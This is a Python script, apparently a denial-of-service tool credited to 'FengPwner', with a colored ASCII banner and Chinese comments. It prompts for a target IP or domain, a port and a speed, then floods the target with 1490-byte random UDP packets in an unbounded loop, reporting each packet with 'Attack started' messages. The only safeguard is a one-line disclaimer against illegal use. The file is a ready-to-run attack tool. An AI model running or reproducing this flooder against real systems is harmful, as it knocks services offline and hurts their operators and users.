# python3
import sys
import os
import time
import socket
import random
from datetime import datetime
from socket import gethostbyname 

# ================= 颜色与样式定义 =================
class color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"

# ================= 全局变量与初始化 =================
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# ================= 界面与交互函数 =================
def show_banner():
    """显示美观的启动界面"""
    os.system("clear")
    banner = f"""{color.CYAN}{color.BOLD}
   ███████╗███████╗███╗   ██╗███████╗██╗    ██╗
   ██╔════╝██╔════╝████╗  ██║██╔════╝██║    ██║
   █████╗  █████╗  ██╔██╗ ██║█████╗  ██║ █╗ ██║
   ██╔══╝  ██╔══╝  ██║╚██╗██║██╔══╝  ██║███╗██║
   ██║     ███████╗██║ ╚████║███████╗╚███╔███╔╝
   ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ 
{color.RESET}"""
    print(banner)
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.BOLD} Author :{color.RESET} FengPwner")
    print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
    print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
    print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
    print(f"{color.BOLD} Version:{color.RESET} 1.0.0 (UI Refactored)")
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")

def handle_error(allow_edit=True):
    """统一的错误交互处理"""
    while True:
        if allow_edit:
            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            elif choice == 'e': return 'e'
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
        else:
            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")

# ================= 主程序逻辑 =================
while True:
    show_banner()

    # --- 1. 目标 IP/域名 解析 ---
    while True:
        target = input(f"{color.BLUE}[1/3] IP or Domain (type 'exit' to quit): {color.RESET}")
        if target.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            ip = gethostbyname(target)
            print(f"{color.GREEN}[+] Resolved target to IP: {ip}{color.RESET}")
            break
        except socket.gaierror:
            print(f"{color.RED}[-] Error: Could not resolve the specified IP or Domain.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'ip' not in locals() or target.strip().lower() == 'exit': continue 

    # --- 2. 端口输入与校验 ---
    while True:
        port_input = input(f"{color.BLUE}[2/3] Port (1-65535, type 'exit' to quit): {color.RESET}")
        if port_input.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            port = int(port_input)
            if not (1 <= port <= 65535): raise ValueError("Port out of range")
            break
        except ValueError:
            print(f"{color.RED}[-] Error: Invalid port. Please enter a number between 1 and 65535.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'port' not in locals(): continue 

    # --- 3. 速度输入与校验 ---
    while True:
        sd_input = input(f"{color.BLUE}[3/3] Speed (1~1000, type 'exit' to quit): {color.RESET}")
        if sd_input.strip().lower() == 'exit':
            print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
            sys.exit(0)
        try:
            sd = int(sd_input)
            if not (1 <= sd <= 1000): raise ValueError("Speed out of range")
            break
        except ValueError:
            print(f"{color.RED}[-] Error: Invalid speed. Please enter a number between 1 and 1000.{color.RESET}")
            action = handle_error(allow_edit=True)
            if action == 'y': break
            elif action == 'e': continue

    if 'sd' not in locals(): continue 

    # --- 4. 开始发包 ---
    os.system("clear")
    print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
    sent = 0
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"{color.GREEN}[+] Sent {sent} data packet to {ip}:{port}{color.RESET}")
            time.sleep((1000 - sd) / 2000)

    except KeyboardInterrupt:
        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")
        action = handle_error(allow_edit=False)
        if action == 'y': continue
